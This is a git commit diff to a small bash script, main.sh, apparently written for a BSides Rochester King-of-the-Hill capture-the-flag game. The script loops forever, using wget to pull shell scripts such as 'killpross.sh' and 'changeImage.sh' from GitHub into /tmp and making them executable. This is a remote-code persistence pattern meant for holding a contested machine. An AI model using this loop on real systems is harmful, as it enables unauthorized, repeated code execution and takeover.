83a85d0a92aed078d3aadac41563e5ce7f1af587
baa7968 <baa7968@rit.edu>
2018-04-13 18:45:09 -0400

    update

--- main.sh
+++ main.sh
@@ -1,7 +1,7 @@
 !#/bin/bash
 while :
 do
-	wget -O /tmp/one.sh https://raw.githubusercontent.com/ckt29175/ctf2018-bisdesroc/master/one.sh  
+	wget -O /tmp/one.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/killpross.sh
 	wget -O /tmp/two.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh
 	sleep 1
 	chmod +x /tmp/one.sh & chmod +x /tmp/two.sh 
